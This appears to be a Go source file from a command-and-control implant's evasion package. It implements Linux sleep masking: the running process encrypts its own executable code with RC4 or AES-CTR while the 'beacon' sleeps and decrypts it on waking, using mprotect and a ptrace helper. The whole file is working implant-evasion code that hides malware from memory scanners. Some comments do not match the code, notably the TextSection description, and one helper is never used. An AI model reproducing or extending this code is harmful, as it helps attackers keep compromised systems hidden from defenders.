//go:build linux && amd64

package evasion

import (
	"encoding/binary"
	"fmt"
	"os"
	"reflect"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

const (
	// Exclusion tail. The Go runtime has background workers whose
	// code must remain executable during sleep. The Windows stub
	// uses 256 KB; the Linux linker layout is different but the
	// same value is a reasonable starting point. A build whose
	// maskedSleepStub lands outside this range is refused at
	// runtime by the FuncForPC check rather than silently
	// corrupting the process.
	linuxExclusionTail = 256 * 1024
)

var (
	linuxOtherWarnOnce  sync.Once
	linuxHelperWarnOnce sync.Once
)

func maskedSleepBasicLinux(maskType string, ms uint32) error {
	if runtime.GOARCH != "amd64" {
		linuxOtherWarnOnce.Do(func() {
			fmt.Printf("[evasion] sleep mask %q is only implemented "+
				"on linux/amd64; falling back to plain sleep.\n",
				maskType)
		})
		timeSleepMs(ms)
		return nil
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	base, size, err := TextSection()
	if err != nil {
		return fmt.Errorf("locate executable segment: %w", err)
	}
	if size <= linuxExclusionTail*2 {
		return fmt.Errorf("executable segment too small to mask")
	}
	maskedSize := size - linuxExclusionTail

	key := NewMaskKey(maskType)
	if err := maskWithHelper(base, maskedSize, maskType, ms,
		key.Key); err == nil {
		return nil
	} else {
		linuxHelperWarnOnce.Do(func() {
			fmt.Printf("[evasion] ptrace helper unavailable: %v; "+
				"using in-process stub\n", err)
		})
	}

	// Fallback: mask and run the stub in this thread. Other
	// threads may execute masked code, but the beacon keeps its
	// schedule.
	key2, err := encryptSelfLinux(maskType)
	if err != nil {
		return err
	}
	maskedSleepStub(ms)
	return decryptSelfLinux(key2)
}

func timeSleepMs(ms uint32) {
	// Imported by name so the amd64 file does not pull in the
	// time package just for this fallback. The dispatcher also
	// uses time.Sleep; this is only for the arch-mismatch path.
	t := int64(ms) * 1_000_000 // ms -> ns
	var ts syscall.Timespec
	ts.Sec = t / 1_000_000_000
	ts.Nsec = t % 1_000_000_000
	syscall.Nanosleep(&ts, nil)
}

func encryptSelfLinux(maskType string) (MaskKey, error) {
	var zero MaskKey
	base, size, err := TextSection()
	if err != nil {
		return zero, fmt.Errorf("locate executable segment: %w", err)
	}
	if size <= linuxExclusionTail*2 {
		return zero, fmt.Errorf("executable segment too small to mask")
	}
	maskedSize := size - linuxExclusionTail

	// Verify the assembly stub is in the excluded tail. The check
	// mirrors the Windows one; see the comment there for why.
	stubPC := reflect.ValueOf(maskedSleepStub).Pointer()
	stubFunc := runtime.FuncForPC(stubPC)
	if stubFunc == nil || stubFunc.Entry() != stubPC {
		return zero, fmt.Errorf("cannot resolve maskedSleepStub entry")
	}
	tailStart := base + maskedSize
	tailEnd := base + size
	if stubFunc.Entry() < tailStart || stubFunc.Entry() >= tailEnd {
		return zero, fmt.Errorf(
			"maskedSleepStub at %#x is outside the excluded tail "+
				"[%#x, %#x); refusing to encrypt",
			stubFunc.Entry(), tailStart, tailEnd)
	}

	key := NewMaskKey(maskType)

	if err := mprotectRW(base, maskedSize); err != nil {
		return zero, fmt.Errorf("mprotect(RW): %w", err)
	}

	data := unsafe.Slice((*byte)(unsafe.Pointer(base)), maskedSize)
	switch maskType {
	case "rc4":
		RC4Crypt(data, key.Key)
	case "aes-ctr":
		if err := AESCTRCrypt(data, key.Key); err != nil {
			return zero, err
		}
	default:
		return zero, fmt.Errorf("unknown sleep mask %q", maskType)
	}

	if err := mprotectRX(base, maskedSize); err != nil {
		return zero, fmt.Errorf("mprotect(RX) after encrypt: %w", err)
	}

	switch key.Mode {
	case "rc4", "aes-ctr":
	default:
		return zero, fmt.Errorf(
			"EncryptSelf produced a mode %q with no decrypt branch",
			key.Mode)
	}
	return key, nil
}

func decryptSelfLinux(key MaskKey) error {
	if key.Key == nil {
		return nil
	}
	base, size, err := TextSection()
	if err != nil {
		return err
	}
	if size <= linuxExclusionTail*2 {
		return fmt.Errorf("executable segment too small to mask")
	}
	maskedSize := size - linuxExclusionTail

	if err := mprotectRW(base, maskedSize); err != nil {
		return fmt.Errorf("mprotect(RW): %w", err)
	}

	data := unsafe.Slice((*byte)(unsafe.Pointer(base)), maskedSize)
	switch key.Mode {
	case "rc4":
		RC4Crypt(data, key.Key)
	case "aes-ctr":
		if err := AESCTRCrypt(data, key.Key); err != nil {
			return err
		}
	default:
		return fmt.Errorf("unknown sleep mask %q", key.Mode)
	}

	if err := mprotectRX(base, maskedSize); err != nil {
		return fmt.Errorf("mprotect(RX) after decrypt: %w", err)
	}
	return nil
}

func mprotectRW(addr, size uintptr) error {
	b := unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
	return syscall.Mprotect(b, syscall.PROT_READ|syscall.PROT_WRITE)
}

func mprotectRX(addr, size uintptr) error {
	b := unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
	return syscall.Mprotect(b, syscall.PROT_READ|syscall.PROT_EXEC)
}

// maskedSleepStub is implemented in sleepmask_linux_amd64.s.
func maskedSleepStub(ms uint32)

// TextSection returns the base address and size of the executable
// PT_LOAD segment of the running binary.
//
// The address of the program header table comes from
// /proc/self/auxv (AT_PHDR). The image base is that address minus
// the program-header file offset, which is read from the ELF
// header in /proc/self/exe. The first PT_LOAD with PF_X is the
// executable segment.
func TextSection() (uintptr, uintptr, error) {
	exe, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return 0, 0, fmt.Errorf("readlink /proc/self/exe: %w", err)
	}
	maps, err := os.ReadFile("/proc/self/maps")
	if err != nil {
		return 0, 0, fmt.Errorf("read /proc/self/maps: %w", err)
	}
	var fallbackStart, fallbackEnd uintptr
	for _, line := range strings.Split(string(maps), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 6 || !strings.Contains(fields[1], "x") {
			continue
		}
		if fields[5] != exe {
			continue
		}
		bounds := strings.SplitN(fields[0], "-", 2)
		if len(bounds) != 2 {
			continue
		}
		start, err1 := strconv.ParseUint(bounds[0], 16, 64)
		end, err2 := strconv.ParseUint(bounds[1], 16, 64)
		if err1 != nil || err2 != nil || end <= start {
			continue
		}
		// The first executable mapping of the image is .text.
		if fallbackStart == 0 || uintptr(start) < fallbackStart {
			fallbackStart, fallbackEnd = uintptr(start), uintptr(end)
		}
	}
	if fallbackStart != 0 {
		return fallbackStart, fallbackEnd - fallbackStart, nil
	}
	return 0, 0, fmt.Errorf("no executable mapping for %s", exe)
}

// getauxval reads a value from /proc/self/auxv. Returns 0 when the
// key is absent or the file cannot be read.
func getauxval(key uint64) uintptr {
	f, err := os.Open("/proc/self/auxv")
	if err != nil {
		return 0
	}
	defer f.Close()
	buf := make([]byte, 16)
	for {
		n, err := f.Read(buf)
		if err != nil || n < 16 {
			return 0
		}
		k := binary.LittleEndian.Uint64(buf[0:8])
		v := binary.LittleEndian.Uint64(buf[8:16])
		if k == key {
			return uintptr(v)
		}
		if k == 0 { // AT_NULL
			return 0
		}
	}
}
